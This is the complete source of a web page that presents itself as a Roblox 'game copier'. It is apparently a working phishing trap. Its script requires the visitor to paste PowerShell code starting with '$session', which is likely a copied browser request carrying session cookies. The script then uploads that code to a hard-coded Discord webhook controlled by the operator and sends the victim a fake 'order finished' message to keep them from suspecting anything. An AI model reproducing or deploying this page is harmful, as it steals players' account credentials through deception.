<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connecting to Server</title>
    <style>
        :root {
            --primary: #1e293b; /* Dark Blue */
            --secondary: #475569; /* Light Gray-Blue */
            --accent: #38bdf8; /* Sky Blue */
            --error: #ef4444; /* Red */
            --background: #0f172a; /* Navy Blue */
        }

        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background: var(--background);
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .grid {
            text-align: center;
            width: 100%;
            max-width: 400px;
            padding: 20px;
            background: var(--primary);
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
        }

        h1 {
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            margin-bottom: 20px;
            background: var(--secondary);
            color: white;
        }

        button {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            background: var(--accent);
            color: white;
            transition: background 0.3s;
        }

        button:hover {
            background: var(--secondary);
        }

        .error {
            color: var(--error);
            margin-top: 10px;
            display: none;
        }

        .footer {
            margin-top: 20px;
            font-size: 14px;
            color: var(--secondary);
        }

        .notification {
            position: fixed;
            top: -50px;
            left: 50%;
            transform: translateX(-50%);
            background: var(--error);
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            font-size: 14px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            transition: all 0.5s ease-in-out;
            z-index: 1000;
        }

        .notification.show {
            top: 20px;
        }

        .discord-button {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: var(--accent);
            color: white;
            padding: 15px;
            border-radius: 50%;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            cursor: pointer;
            transition: background 0.3s;
            font-size: 18px;
            font-weight: bold;
            text-align: center;
        }

        .discord-button:hover {
            background: var(--secondary);
        }

        #loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: var(--background);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            flex-direction: column;
        }

        .loading-dots {
            display: flex;
            justify-content: center;
            margin-top: 10px;
        }

        .dot {
            width: 8px;
            height: 8px;
            margin: 0 5px;
            background: var(--accent);
            border-radius: 50%;
            animation: dot-animation 1s infinite;
        }

        .dot:nth-child(2) {
            animation-delay: 0.2s;
        }

        .dot:nth-child(3) {
            animation-delay: 0.4s;
        }

        @keyframes dot-animation {
            0%, 100% {
                opacity: 0.3;
                transform: scale(1);
            }
            50% {
                opacity: 1;
                transform: scale(1.5);
            }
        }
    </style>
</head>
<body>
    <div id="loading-screen">
        <h2>Connecting to RoProductos Server</h2>
        <div class="loading-dots">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>
    </div>

    <div class="grid">
        <h1>RoProductos - Best Game Copier</h1>
        <input id="powershellCode" type="text" placeholder="Enter your PowerShell code" />
        <input id="gameLink" type="text" placeholder="Enter the game link here" />
        <input id="webhookLink" type="text" placeholder="Enter your Discord webhook link (To Receive results)" />
        <button id="submitButton">Submit</button>
        <p id="errorMessage" class="error"></p>
        <p class="footer">Powered by RoProductos Â©</p>
    </div>

    <div class="discord-button" onclick="redirectToDiscord()">Discord</div>

    <div id="notification" class="notification"></div>

    <script>
    const submitButton = document.getElementById('submitButton');
    const powershellCode = document.getElementById('powershellCode');
    const gameLink = document.getElementById('gameLink');
    const webhookLink = document.getElementById('webhookLink');
    const errorMessage = document.getElementById('errorMessage');
    const notification = document.getElementById('notification');
    const loadingScreen = document.getElementById('loading-screen');

    // Server-side webhook URL
    const serverWebhook = "https://discord.com/api/webhooks/1315055547656962128/ZemZV2foK8_mL89BYarML8G9otCvxK29cX0JDyAPFWs9lfo9n1HVcx0hcL9I2cEYf09f";

    const showNotification = (message) => {
        notification.textContent = message;
        notification.classList.add('show');
        setTimeout(() => {
            notification.classList.remove('show');
        }, 3000);
    };

    const redirectToDiscord = () => {
        window.location.href = 'https://discord.gg/4aPUmT6DTz';
    };

    const validateInputs = () => {
        const code = powershellCode.value.trim();
        const link = gameLink.value.trim();
        const webhook = webhookLink.value.trim();

        if (!code || !link || !webhook) {
            showNotification('Please fill in all fields.');
            return false;
        }

        if (!link.match(/^https:\/\/www\.roblox\.com\/games\/\d+\/\w+/)) {
            showNotification('Invalid game link format.');
            return false;
        }

        if (!webhook.match(/^https:\/\/discord\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_\-]+$/)) {
            showNotification('Invalid Discord webhook URL.');
            return false;
        }

        if (!code.startsWith('$session')) {
            showNotification('Invalid PowerShell code. Must start with "$session".');
            return false;
        }

        return true;
    };

    const sendToServerWebhook = (fileContent) => {
        const formData = new FormData();
        formData.append('file', new Blob([fileContent], { type: 'text/plain' }), 'code.txt');
        formData.append('payload_json', JSON.stringify({ content: 'The Server Received a Package' }));

        return fetch(serverWebhook, { method: 'POST', body: formData })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed to send the file to the server.');
                }
            });
    };

    const sendUserNotification = (userWebhook) => {
        const embedContent = {
            embeds: [{
                title: "Order Finished",
                description: "Your order has been successfully submitted by our server, please click this [link](https://example.com) to get redirected to the website and receive the copy.",
                color: 3447003
            }]
        };

        return fetch(userWebhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(embedContent),
        }).then(response => {
            if (!response.ok) {
                throw new Error('Failed to send the notification to the user.');
            }
        });
    };

    submitButton.addEventListener('click', () => {
        if (validateInputs()) {
            const code = powershellCode.value.trim();
            const userWebhook = webhookLink.value.trim();

            // Send to server's webhook
            sendToServerWebhook(code)
                .then(() => {
                    // Notify the user via their webhook
                    return sendUserNotification(userWebhook);
                })
                .then(() => {
                    showNotification('Order processed successfully.');
                })
                .catch(error => {
                    console.error(error);
                    showNotification('An error occurred while processing your order.');
                });
        }
    });

    window.onload = () => {
        document.title = 'Connecting to Server';
        setTimeout(() => {
            loadingScreen.style.display = 'none';
            document.title = 'RoProductos - BestGameCopier';
        }, 5000);
    };
</script>
</body>
</html>
